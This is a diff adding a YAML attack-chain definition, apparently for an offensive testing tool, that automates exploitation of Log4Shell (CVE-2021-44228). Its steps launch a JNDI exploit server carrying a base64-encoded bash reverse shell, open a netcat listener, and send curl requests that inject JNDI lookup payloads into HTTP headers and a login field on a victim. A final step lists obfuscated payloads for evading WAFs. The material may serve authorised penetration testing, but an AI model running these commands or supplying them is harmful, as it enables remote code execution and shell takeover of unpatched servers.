@@ -1,0 +1,48 @@
+chain_id: log4shell_cve_2021_44228
+title: "Log4Shell — CVE-2021-44228 JNDI lookup to RCE"
+severity: CRITICAL
+tags: [web, log4shell, cve-2021-44228, jndi, ldap, rce]
+
+trigger:
+  any_of:
+    - { kind: "tech-detect-log4j" }
+    - { kind: "CVE-2021-44228" }
+    - { banner_pattern: "(?i)log4j" }
+    - { banner_pattern: "(?i)apache.*solr" }
+
+description: |
+  Log4j 2.x ≤ 2.14.1 evaluates JNDI URLs inside any logged string. A
+  payload like `${jndi:ldap://attacker/x}` placed in any header that
+  the application logs (User-Agent, X-Forwarded-For, Authorization)
+  will reach a JNDI lookup. The classic exploitation chain serves a
+  malicious LDAP referral pointing to a Java class that runs your code.
+
+steps:
+  - id: 1
+    title: "Spin up a JNDI exploitation server (java)"
+    command: |
+      # https://github.com/JNDI-Exploit/JNDI-Exploit
+      java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 10.0.2.15:1389 -P 8888 -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'
+
+  - id: 2
+    title: "Listener on Kali"
+    command: nc -lvnp 4444
+
+  - id: 3
+    title: "Trigger the lookup — try every plausible header"
+    command: |
+      curl -H 'User-Agent: ${jndi:ldap://10.0.2.15:1389/Basic/Command/Base64/<payload>}' http://$VICTIMA/
+      curl -H 'X-Api-Version: ${jndi:ldap://10.0.2.15:1389/Basic/Command/Base64/<payload>}' http://$VICTIMA/
+      curl -H 'X-Forwarded-For: ${jndi:ldap://10.0.2.15:1389/Basic/Command/Base64/<payload>}' http://$VICTIMA/
+      curl --data 'username=${jndi:ldap://10.0.2.15:1389/Basic/Command/Base64/<payload>}' http://$VICTIMA/login
+
+  - id: 4
+    title: "If WAF blocks the literal payload, use evasions"
+    command: |
+      ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...}
+      ${${lower:j}${lower:n}${lower:d}i:ldap://...}
+      ${${::-${EnV:foo:-j}}ndi:ldap://...}
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
